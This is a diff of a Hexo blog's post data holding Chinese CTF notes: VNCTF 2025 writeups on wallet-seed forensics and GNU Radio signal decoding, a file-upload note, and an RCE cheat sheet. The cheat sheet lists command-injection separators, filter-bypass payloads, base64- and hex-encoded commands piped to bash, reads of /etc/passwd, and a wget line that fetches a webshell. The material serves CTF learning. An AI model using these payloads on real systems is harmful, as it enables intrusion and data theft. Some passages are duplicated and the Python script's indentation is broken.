-<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
-<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
-<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
-<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
-<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
-<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
-<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
-<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
-<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
-<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
-<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
-<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
-<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
-<p>那么将压缩包复制到Ubuntu</p>
-<pre><code class="highlight bash">unzip ezSignal_fix.zip
-<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
-
-<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
-<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
-<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
-<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
-<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
-<pre><code class="highlight plaintext">import numpy as np
-from scipy.io import wavfile
-from scipy.signal import butter, lfilter
-
-def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
-    &quot;&quot;&quot;
-    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
-    - dtype: 数据类型（默认 float32）
-    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
-    &quot;&quot;&quot;
-    # 以二进制模式读取文件
-    with open(filename, &quot;rb&quot;) as f:
-        raw_bytes = f.read()
-    
-
-# 转换为指定字节序和类型的 numpy 数组
-
-dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
-data = np.frombuffer(raw_bytes, dtype=dt)
-return data
-
-def main():
-
-    # 参数配置（与 GRC 一致）
-
-     samp_rate = 48000      # 音频采样率
-     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
-     max_dev = 5e3          # FM最大频偏
-     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）
-
-try:
-
-    # 1. 读取I/Q数据（二进制模式）
-
-     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
-     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)
-
-    # 检查长度一致性
-
-     if len(i_data) != len(q_data):
-         raise ValueError(&quot;I/Q数据长度不一致！&quot;)
-
-    # 2. 合并为复数信号（I + jQ）
-
-     complex_signal = i_data + 1j * q_data
-
-    # 3. FM解调（相位差分法）
-
-     phase = np.unwrap(np.angle(complex_signal))
-     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
-     demodulated = demodulated.astype(np.float32)
-
-    # 4. 重采样到音频采样率（48 kHz）
-
-     demodulated_resampled = demodulated[::4]  # 简单下采样
-
-    # 5. 低通滤波（300-5000 Hz，与GRC一致）
-
-     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
-     demodulated_resampled = lfilter(b, a, demodulated_resampled)
-
-    # 6. 归一化并保存为WAV
-
-     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
-     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)
-
-     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)
-
-except FileNotFoundError:
-    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
-except Exception as e:
-    print(f&quot;错误：&#123;str(e)&#125;&quot;)
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-
-<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
-<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
-<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
-]]></content>
-      <tags>
-        <tag>-CTF -Writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
-<p>弱判断:bp改一下就能过</p>
-<p>增加文件头</p>
-<p>改phtml绕过</p>
-<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
-<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
-<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
@@ -2413,6 +2078,792 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 <p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
 <h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
 <p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE</title>
+    <url>/2025/01/21/RCE/</url>
+    <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
+<p><strong>原理</strong></p>
+<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
+<p><strong>系统命令执行函数</strong></p>
+<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
+*** passthru() system()的平替，写个命令就会执行命令，自己能回显
+*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
+*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
+*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
+*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
+$command是要执行的命令。
+$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
+$pipes是一个引用变量，用于存储与进程相关的管道。
+$cwd（可选）是设置子进程的当前工作目录。
+$env（可选）是设置子进程的环境变量。
+$other_options（可选）是其他选项，如设置超时等
+不能直接回显
+*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
+path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
+envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>
+
+<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
+<p>那么就需要管道符来支持：</p>
+<p>*<strong>关于管道符</strong></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
+<p><strong>For Windows：</strong></p>
+<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
+<p><strong>For Linux:</strong></p>
+<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
+<p>发现漏洞后，如何得到控制权呢？</p>
+<p>最简单的漏洞就是找到注入点直接注</p>
+<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
+<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>
+
+<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
+<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
+<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>
+
+<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
+<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>
+
+<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
+<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>
+
+<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
+<p>%09绕过（相当于Tab键）</p>
+<p>%0a–代表换行符</p>
+<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
+<p>%0d–回车换行</p>
+<p>%a0–代表的是非断行空格</p>
+<p>%00–%00代表的是ASCII码中的空字符</p>
+<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
+<p>内联注释绕过知识点</p>
+<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
+</code></pre>
+<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
+<pre><code class="highlight plaintext">cat /fl??
+
+cat /f*  #多个匹配结果同时展现</code></pre>
+
+<p>以上指令等效于<code>cat /flag</code></p>
+<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag
+
+c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>
+
+<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
+<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>
+
+<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
+<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>
+
+<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
+<pre><code class="highlight plaintext">cat /fl$9ag
+
+cat /fl$@ag</code></pre>
+
+<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
+<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd
+
+cat$x /etc$x/passwd$x
+
+ca$@t /etc$x/passwd$x</code></pre>
+
+<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
+<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
+<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
+<p>echo $PATH              #PATH默认系统环境变量</p>
+<p>如果出现：</p>
+<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>
+
+<p>则以下代码表示了flag.php</p>
+<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>
+
+<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
+<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
+echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>
+
+<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
+<p>执行命令的话有三种形式：</p>
+<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash
+
+$(echo Y2FOIGZsYWcucGhw | base64 -d)
+
+`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>
+
+<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
+<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>
+
+<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
+s = b&quot;tac flag&quot;
+h = binascii.b2a_hex(s)
+print(h)</code></pre>
+
+<p>tac flag–&gt; 74616320666c6167</p>
+<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>
+
+<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
+<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>
+
+<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);
+
+?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);
+
+?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>
+
+<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
+<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
+<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
+<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
+<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
+<p>别的指令也同理</p>
+<ul>
+<li><p>tac:反向显示，从最后一行开始往前显示</p>
+<pre><code class="highlight plaintext">tac /flag</code></pre>
+
+
+</li>
+<li><p>more:一页一页显示档案内容</p>
+<pre><code class="highlight plaintext">more flag.php</code></pre>
+
+
+</li>
+<li><p>less：与more类似</p>
+</li>
+<li><p>tail：查看末尾几行</p>
+</li>
+<li><p>nl：显示的时候，顺便输出行号</p>
+<pre><code class="highlight plaintext">nl /flag</code></pre></li>
+</ul>
+<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
+<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
+<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
+<ul>
+<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
+</ul>
+<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>
+
+<ul>
+<li><p>xxd：读取二进制文件</p>
+<pre><code class="highlight plaintext">xxd /flag</code></pre>
+
+
+</li>
+<li><p>sort：主要用于排序文件 </p>
+<pre><code class="highlight plaintext">so?t /flag
+/usr/bin/s?rt /flag</code></pre></li>
+</ul>
+<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
+<ul>
+<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
+<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
+<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
+</ul>
+<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
+<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
+<ul>
+<li>strings：<br>相当于cat</li>
+</ul>
+<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
+<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
+<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
+<p>3.利用cp命令：cp flag.php 1.txt</p>
+<p>4.利用mv命令：mv flag.php 1.txt</p>
+<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
+<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
+<p>7.利用wget下载：</p>
+<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
+
+<p>8.dnslog外带数据</p>
+<h2 id="都是fakeflag-试试环境变量-proc-self-environ和env指令"><a href="#都是fakeflag-试试环境变量-proc-self-environ和env指令" class="headerlink" title="都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令"></a>都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</h2>]]></content>
+      <tags>
+        <tag>-Web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VNCTF2025</title>
+    <url>/2025/02/10/VNCTF2025/</url>
+    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
+<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
+<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
+<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
+<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
+<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
+<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
+<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
+<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
+<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
+<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
+<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
+<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
+<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
+<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
+<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
+<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
+<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
+<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
+<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
+<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
+<p>那么将压缩包复制到Ubuntu</p>
+<pre><code class="highlight bash">unzip ezSignal_fix.zip
+<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
+
+<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
+<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
+<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
+<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
